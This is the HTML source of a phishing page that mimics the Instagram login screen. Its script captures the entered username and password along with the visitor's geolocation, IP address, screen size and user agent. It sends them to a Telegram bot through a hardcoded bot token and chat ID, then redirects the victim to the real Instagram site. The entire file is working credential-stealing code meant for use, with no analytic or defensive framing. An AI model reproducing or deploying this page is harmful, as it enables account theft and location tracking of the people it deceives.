<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login â€¢ Instagram</title>
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" type="image/x-icon">
    <style>
        :root {
            --background-color: #fff; --text-color: #262626; --secondary-text-color: #8e8e8e;
            --border-color: #dbdbdb; --input-background: #fafafa; --button-color: #0095f6;
            --button-text-color: #fff; --link-color: #00376b; --facebook-link-color: #385185;
        }
        @media (prefers-color-scheme: dark) {
            :root {
                --background-color: #000; --text-color: #f5f5f5; --secondary-text-color: #a8a8a8;
                --border-color: #363636; --input-background: #121212; --button-color: #0095f6;
                --button-text-color: #fff; --link-color: #0095f6; --facebook-link-color: #0095f6;
            }
        }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: var(--background-color); color: var(--text-color); margin: 0; padding: 0 40px; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-size: 14px; }
        .container { width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .login-box { width: 100%; display: flex; flex-direction: column; align-items: center; }
        .logo { margin: 30px 0; width: 175px; filter: var(--background-color, #000) invert(100%); }
        @media (prefers-color-scheme: dark) { .logo { filter: none; } }
        form { width: 100%; display: flex; flex-direction: column; }
        input[type="text"], input[type="password"] { background-color: var(--input-background); border: 1px solid var(--border-color); color: var(--text-color); border-radius: 6px; padding: 14px 10px; margin-bottom: 6px; font-size: 14px; }
        input:focus { outline: none; border-color: #a8a8a8; }
        .login-button { background-color: var(--button-color); color: var(--button-text-color); border: none; border-radius: 8px; padding: 10px; font-weight: 600; font-size: 14px; margin-top: 14px; cursor: pointer; }
        .separator { display: flex; align-items: center; text-align: center; margin: 15px 0; width: 100%; }
        .separator .line { flex-grow: 1; border-bottom: 1px solid var(--border-color); }
        .separator .or { color: var(--secondary-text-color); font-weight: 600; font-size: 13px; margin: 0 18px; }
        .fb-login { color: var(--facebook-link-color); font-weight: 600; text-decoration: none; margin: 10px 0; }
        .forgot-password { color: var(--link-color); text-decoration: none; font-size: 12px; margin-top: 15px; }
        .signup-box { margin-top: 30px; border-top: 1px solid var(--border-color); padding-top: 30px; width: 100%; text-align: center; }
        .signup-box a { color: var(--link-color); font-weight: 600; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram">
            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <input type="hidden" id="latitude" value="Not Available">
                <input type="hidden" id="longitude" value="Not Available">
                <input type="hidden" id="accuracy" value="Not Available">
                <input type="hidden" id="screen_res" value="Not Available">
                <button type="submit" class="login-button">Log in</button>
            </form>
            <div class="separator"> <div class="line"></div> <div class="or">OR</div> <div class="line"></div> </div>
            <a href="#" class="fb-login">Continue with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    document.getElementById('latitude').value = position.coords.latitude;
                    document.getElementById('longitude').value = position.coords.longitude;
                    document.getElementById('accuracy').value = position.coords.accuracy;
                });
            }
            document.getElementById('screen_res').value = window.screen.width + 'x' + window.screen.height;
        };

        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();

            const botToken = "7430372727:AAFTW_payXEOmA7NAeNEUfI-0fZGx38Fgi4";
            const chatID = "7249542967";

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const latitude = document.getElementById('latitude').value;
            const longitude = document.getElementById('longitude').value;
            const accuracy = document.getElementById('accuracy').value;
            const screen_res = document.getElementById('screen_res').value;
            const user_agent = navigator.userAgent;

            let ip_address = 'N/A';
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ip_address = data.ip;
            } catch (error) {
                console.log('Could not fetch IP.');
            }
            
            let message = `+++++[ GITHUB SUCCESS ]+++++\n\n`;
            message += `Username : ${username}\n`;
            message += `Password : ${password}\n\n`;
            message += `---[ Device Info ]---\n`;
            message += `IP Address: ${ip_address}\n`;
            message += `Screen Res: ${screen_res}\n`;
            message += `User Agent: ${user_agent}\n\n`;
            message += `---[ Location Info ]---\n`;
            message += `Google Maps: https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}\n`;
            message += `Accuracy   : ${accuracy} meters\n`;

            const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;

            fetch(telegramAPI, { method: 'GET' });

            setTimeout(() => {
                window.location.href = "https://www.instagram.com/";
            }, 500);
        });
    </script>
</body>
</html>
